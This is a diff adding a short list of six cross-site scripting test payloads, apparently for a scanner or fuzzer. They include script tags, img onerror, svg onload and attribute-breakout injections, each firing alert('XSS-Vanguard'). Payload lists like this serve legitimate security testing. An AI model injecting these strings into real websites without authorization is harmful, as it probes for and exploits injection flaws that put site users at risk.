@@ -1,0 +1,6 @@
+<script>alert('XSS-Vanguard')</script>
+
+<img src=x onerror=alert('XSS-Vanguard')>
+"><script>alert('XSS-Vanguard')</script>
+' onmouseover=alert('XSS-Vanguard')>
+<svg/onload=alert('XSS-Vanguard')>
